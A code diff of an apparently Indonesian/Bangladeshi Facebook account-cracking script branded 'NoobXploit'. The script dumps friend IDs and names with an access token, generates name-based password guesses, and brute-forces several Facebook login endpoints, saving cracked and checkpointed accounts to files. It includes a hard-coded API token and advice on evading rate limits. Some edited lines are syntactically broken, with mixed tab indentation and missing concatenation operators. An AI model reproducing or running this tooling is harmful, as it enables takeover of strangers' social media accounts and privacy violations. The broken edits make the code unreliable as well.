@@ -303,17 +303,17 @@ def ___masal2___():
             file = open(___file___ , 'a')
             for a in rex['friends']['data']:
                 if len(a['id'])==7 or len(a['id'])==8 or len(a['id'])==9 or len(a['id'])==10:
-                    file.write(a['id']+"<=>"+a['lower(name)']+'\n')
-                    print("\r\x1b[1;97m"+a['id']+"<=>"+a['lower(name)'])
+                    file.write(a['id']+"<=>"+a['name']+'\n')
+                    print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
                 elif a['id'][:10] in ['1000000000']:
-                    file.write(a['id']+"<=>"+a['lower(name)']+'\n')
-                    print("\r\x1b[1;97m"+a['id']+"<=>"+a['lower(name)'])
+                    file.write(a['id']+"<=>"+a['name']+'\n')
+                    print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
                 elif a['id'][:9] in ['100000000']:
-                    file.write(a['id']+"<=>"+a['lower(name)']+'\n')
-                    print("\r\x1b[1;97m"+a['id']+"<=>"+a['lower(name)'])
+                    file.write(a['id']+"<=>"+a['name']+'\n')
+                    print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
                 elif a['id'][:8] in ['10000000']:
-                    file.write(a['id']+"<=>"+a['lower(name)']+'\n')
-                    print("\r\x1b[1;97m"+a['id']+"<=>"+a['lower(name)'])
+                    file.write(a['id']+"<=>"+a['name']+'\n')
+                    print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
                 elif a['id'][:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:
                     file.write(a['id']+"<=>"+a['name']+'\n')
                     print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
@@ -525,7 +525,7 @@ def ___acak___():
         exit("%s[%s!%s]%s Dump Fail"%(P,M,P,M))
     except (ConnectionError):
         exit("%s[%s!%s]%s Connection Error"%(P,K,P,K))
-# Dump Publik Old
+# Dump Public Old
 def ___old___():
     try:
         ___token___ = open('login.txt','r').read()
@@ -574,7 +574,7 @@ def ___old___():
         exit("%s[%s!%s]%s Dump Fail"%(P,M,P,M))
     except (ConnectionError):
         exit("%s[%s!%s]%s Connection Error"%(P,K,P,K))
-# Dump Publik New
+# Dump Public New
 def ___new___():
     try:
         ___token___ = open('login.txt','r').read()
@@ -589,7 +589,7 @@ def ___new___():
         ___file___ = oxo['name'].replace(' ','_') + '.json'
         print(" ")
     except (KeyError):
-        exit("%s[%s!%s]%s User There isn't any"%(P,M,P,M))
+        exit("%s[%s!%s]%s There isn't any User"%(P,M,P,M))
     try:
         rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(___ids___,___token___)).json()
         file = open(___file___ , 'a')
@@ -617,7 +617,7 @@ def ___metode___():
     print("%s[%s6%s]%s Metode x.facebook.com %s[%sNew%s]"%(M,P,M,P,B,H,B))
     ___metode___ = raw_input("\n%s[%s?%s]%s Choose :%s "%(B,H,B,P,K))
     if ___metode___ in ['1','01']:
-        print("\n%s[%s1%s]%s Use Password [Name,Name123,Name12345,name121]"%(H,P,H,P))
+        print("\n%s[%s1%s]%s Use Password [Name,Name123,Name12345,name121,123456,12345678]"%(H,P,H,P))
         print("%s[%s2%s]%s Use Password [Name,Name123,Name1234,Name12345,Name123456]"%(H,P,H,P))
         print("%s[%s3%s]%s Use Password [Name,Name123,Name1234,Name12345,iloveyou,fuckyou]"%(H,P,H,P))
         print("%s[%s4%s]%s Use Password Manual [ Make Your Own Password ]"%(H,P,H,P))
@@ -631,7 +631,7 @@ def ___metode___():
             ___file___ = raw_input("%s[%s?%s]%s File Dump :%s "%(H,P,H,P,B))
             ids=open(___file___).read().splitlines()
         except:
-            exit("%s[%s!%s]%s File There isn't any"%(P,M,P,M))
+            exit("%s[%s!%s]%s There isn't any File"%(P,M,P,M))
         print("\n%s[%sâ€¢%s]%s NoobXploit Ok Saved in :%s Results/Ok.txt"%(B,P,B,P,H))
         print("%s[%sâ€¢%s]%s NoobXploit Cp Saved in :%s Results/Cp.txt"%(B,P,B,P,K))
         print("%s[%s!%s]%s Use Airplane Mode In Numbers1000,2000...\n"%(B,M,B,P))
@@ -640,13 +640,13 @@ def ___metode___():
                 uid, Name = user.split('<=>')
                 ox = Name.split(' ')
                 if ___password___ in ['1','01']:
-                    pwx = [Name, ox[0]+'123', ox[0]+'12345', ox[0]+'121', ox[0]+'1234']
+                    pwx = [Name, ox[0]+'123', ox[0]+'12345',ox[0]'121',ox[0]'123456']
                 elif ___password___ in ['2','02']:
                     pwx = [Name, ox[0]+'123', ox[0]+'1234', ox[0]+'12345', ox[0]+'123456']
                 elif ___password___ in ['3','03']:
                     pwx = [Name, ox[0]+'123', ox[0]+'12345', 'NoobXploit', 'fuck you', 'Iloveyou', 'Bangladesh', 'Bismillah', '123456', 'Beautiful']
                 elif ___password___ in ['4','04']:
-                    pwx = pwd.lower()
+                    pwx = pwd
                 else:
                     pwx = [Name, ox[0]+'123', ox[0]+'1234', ox[0]+'12345']
                 hayuk.submit(mbasic, ids, uid, pwx)
@@ -667,7 +667,7 @@ def ___metode___():
             ___file___ = raw_input("%s[%s?%s]%s File Dump :%s "%(H,P,H,P,B))
             ids=open(___file___).read().splitlines()
         except:
-            exit("%s[%s!%s]%s File There isn't any"%(P,M,P,M))
+            exit("%s[%s!%s]%s There isn't any File"%(P,M,P,M))
         print("\n%s[%sâ€¢%s]%s NoobXploit Ok Saved in :%s Results/Ok.txt"%(B,P,B,P,H))
         print("%s[%sâ€¢%s]%s NoobXploit Cp Saved in :%s Results/Cp.txt"%(B,P,B,P,K))
         print("%s[%s!%s]%s Use Airplane Mode In Numbers1000,2000...\n"%(B,M,B,P))
@@ -689,7 +689,7 @@ def ___metode___():
         os.remove(___file___)
         exit("\n%s[%sDone%s]"%(B,H,B))
     elif ___metode___ in ['3','03']:
-        print("\n%s[%s1%s]%s Use Password [Name,Name123,Name12345]"%(H,P,H,P))
+        print("\n%s[%s1%s]%s Use Password [Name,Name123,Name121,Name12345]"%(H,P,H,P))
         print("%s[%s2%s]%s Use Password [Name,Name123,Name1234,Name12345,Name123456]"%(H,P,H,P))
         print("%s[%s3%s]%s Use Password [Name,Name123,Name1234,Name12345,NoobXploit,Dll]"%(H,P,H,P))
         print("%s[%s4%s]%s Use Password Manual [ >6 ]"%(H,P,H,P))
@@ -703,7 +703,7 @@ def ___metode___():
             ___file___ = raw_input("%s[%s?%s]%s File Dump :%s "%(H,P,H,P,B))
             ids=open(___file___).read().splitlines()
         except:
-            exit("%s[%s!%s]%s File There isn't any"%(P,M,P,M))
+            exit("%s[%s!%s]%s File Not Found"%(P,M,P,M))
         print("\n%s[%sâ€¢%s]%s NoobXploit Ok Saved in :%s Results/Ok.txt"%(B,P,B,P,H))
         print("%s[%sâ€¢%s]%s NoobXploit Cp Saved in :%s Results/Cp.txt"%(B,P,B,P,K))
         print("%s[%s!%s]%s Use Airplane Mode In Numbers1000,2000...\n"%(B,M,B,P))
@@ -725,7 +725,7 @@ def ___metode___():
         os.remove(___file___)
         exit("\n%s[%sDone%s]"%(B,H,B))
     elif ___metode___ in ['4','04']:
-        print("\n%s[%s1%s]%s Use Password [Name,Name123,Name12345]"%(H,P,H,P))
+        print("\n%s[%s1%s]%s Use Password [Name,Name123,Name121,Name12345]"%(H,P,H,P))
         print("%s[%s2%s]%s Use Password [Name,Name123,Name1234,Name12345,Name123456]"%(H,P,H,P))
         print("%s[%s3%s]%s Use Password [Name,Name123,Name1234,Name12345,NoobXploit,Dll]"%(H,P,H,P))
         print("%s[%s4%s]%s Use Password Manual [ >6 ]"%(H,P,H,P))
@@ -739,7 +739,7 @@ def ___metode___():
             ___file___ = raw_input("%s[%s?%s]%s File Dump :%s "%(H,P,H,P,B))
             ids=open(___file___).read().splitlines()
         except:
-            exit("%s[%s!%s]%s File There isn't any"%(P,M,P,M))
+            exit("%s[%s!%s]%s File Not Found"%(P,M,P,M))
         print("\n%s[%sâ€¢%s]%s NoobXploit Ok Saved in :%s Results/Ok.txt"%(B,P,B,P,H))
         print("%s[%sâ€¢%s]%s NoobXploit Cp Saved in :%s Results/Cp.txt"%(B,P,B,P,K))
         print("%s[%s!%s]%s Use Airplane Mode In Numbers1000,2000...\n"%(B,M,B,P))
@@ -761,7 +761,7 @@ def ___metode___():
         os.remove(___file___)
         exit("\n%s[%sDone%s]"%(B,H,P))
     elif ___metode___ in ['5','05']:
-        print("\n%s[%s1%s]%s Use Password [Name,Name123,Name12345]"%(H,P,H,P))
+        print("\n%s[%s1%s]%s Use Password [Name,Name123,Name121,Name12345]"%(H,P,H,P))
         print("%s[%s2%s]%s Use Password [Name,Name123,Name1234,Name12345,Name123456]"%(H,P,H,P))
         print("%s[%s3%s]%s Use Password [Name,Name123,Name1234,Name12345,NoobXploit]"%(H,P,H,P))
         print("%s[%s4%s]%s Use Password Manual [ >6 ]"%(H,P,H,P))
@@ -775,7 +775,7 @@ def ___metode___():
             ___file___ = raw_input("%s[%s?%s]%s File Dump :%s "%(H,P,H,P,B))
             ids=open(___file___).read().splitlines()
         except:
-            exit("%s[%s!%s]%s File There isn't any"%(P,M,P,M))
+            exit("%s[%s!%s]%s File Not Found"%(P,M,P,M))
         print("\n%s[%sâ€¢%s]%s NoobXploit Ok Saved in :%s Results/Ok.txt"%(B,P,B,P,H))
         print("%s[%sâ€¢%s]%s NoobXploit OK Saved in :%s Results/Cp.txt"%(B,P,B,P,K))
         print("%s[%s!%s]%s Use Airplane Mode In Numbers1000,2000...\n"%(B,M,B,P))
@@ -797,7 +797,7 @@ def ___metode___():
         os.remove(___file___)
         exit("\n%s[%sDone]%s"%(B,H,B))
     elif ___metode___ in ['6','06']:
-        print("\n%s[%s1%s]%s Use Password [Name,Name123,Name12345]"%(H,P,H,P))
+        print("\n%s[%s1%s]%s Use Password [Name,Name123,Name121,Name12345]"%(H,P,H,P))
         print("%s[%s2%s]%s Use Password [Name,Name123,Name1234,Name12345,Name123456]"%(H,P,H,P))
         print("%s[%s3%s]%s Use Password [Name,Name123,Name1234,Name12345,NoobXploit,Dll]"%(H,P,H,P))
         print("%s[%s4%s]%s Use Password Manual [ >6 ]"%(H,P,H,P))
@@ -811,7 +811,7 @@ def ___metode___():
             ___file___ = raw_input("%s[%s?%s]%s File Dump :%s "%(H,P,H,P,B))
             ids=open(___file___).read().splitlines()
         except:
-            exit("%s[%s!%s]%s File There isn't any"%(P,M,P,M))
+            exit("%s[%s!%s]%s File Not Found"%(P,M,P,M))
         print("\n%s[%sâ€¢%s]%s NoobXploit Ok Saved in :%s Results/Ok.txt"%(B,P,B,P,H))
         print("%s[%sâ€¢%s]%s NoobXploit Cp Saved in :%s Results/Cp.txt"%(B,P,B,P,K))
         print("%s[%s!%s]%s Use Airplane Mode In Numbers1000,2000...\n"%(B,M,B,P))
@@ -842,6 +842,7 @@ def mbasic(ids, uid, pwx, **kwargs):
     ); sys.stdout.flush()
     try:
         for pw in pwx:
+        	pw = pw.lower()
             ses = requests.Session()
             ses.headers.update({"origin": "https://mbasic.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "mbasic.facebook.com", "referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
             p = ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8").text
@@ -879,6 +880,7 @@ def free(ids, uid, pwx, **kwargs):
     ); sys.stdout.flush()
     try:
         for pw in pwx:
+        	pw = pw.lower()
             ses = requests.Session()
             ses.headers.update({"origin": "https://free.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "free.facebook.com", "referer": "https://free.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
             p = ses.get("https://free.facebook.com/login/?next&ref=dbl&refid=8").text
@@ -916,6 +918,7 @@ def mobile(ids, uid, pwx, **kwargs):
     ); sys.stdout.flush()
     try:
         for pw in pwx:
+        	pw = pw.lower()
             ses = requests.Session()
             ses.headers.update({"origin": "https://m.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "m.facebook.com", "referer": "https://m.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
             p = ses.get("https://m.facebook.com/login/?next&ref=dbl&refid=8").text
@@ -953,6 +956,7 @@ def crack(ids, uid, pwx, **kwargs):
     ); sys.stdout.flush()
     try:
         for pw in pwx:
+        	pw = pw.lower()
             ses = requests.Session()
             ses.headers.update({"origin": "https://d.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "d.facebook.com", "referer": "https://d.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
             p = ses.get("https://d.facebook.com/login/?next&ref=dbl&refid=8").text
@@ -990,6 +994,7 @@ def api(ids, uid, pwx):
     ); sys.stdout.flush()
     try:
         for pw in pwx:
+        	pw = pw.lower()
             ses = requests.Session()
             headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': ua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
             send = ses.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + str(uid) + '&password=' + str(pw) + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=headers_)
@@ -1016,6 +1021,7 @@ def crack2(ids, uid, pwx, **kwargs):
     ); sys.stdout.flush()
     try:
         for pw in pwx:
+        	pw = pw.lower()
             ses = requests.Session()
             ses.headers.update({"origin": "https://x.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "x.facebook.com", "referer": "https://x.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
             p = ses.get("https://x.facebook.com/login/?next&ref=dbl&refid=8").text
